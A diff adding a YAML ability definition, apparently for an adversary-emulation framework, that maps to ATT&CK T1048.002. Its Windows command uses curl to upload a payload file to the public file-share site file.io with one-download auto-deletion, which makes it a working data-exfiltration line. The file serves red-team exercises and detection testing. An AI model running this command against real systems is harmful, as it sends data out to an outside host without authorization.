@@ -1,0 +1,18 @@
+- description: 'Exfiltrate data HTTPS using curl to file share site file.io
+
+    '
+  id: 36f50411a52fddf639b03b14918d988f
+  name: Exfiltrate data HTTPS using curl windows
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: C:\Windows\System32\Curl.exe -F 'file=@3945c9_artifact' -F 'maxDownloads=1'
+          -F 'autoDelete=true' https://file.io/
+        payloads:
+        - 3945c9_artifact
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.002
+    name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted
+      Non-C2 Protocol
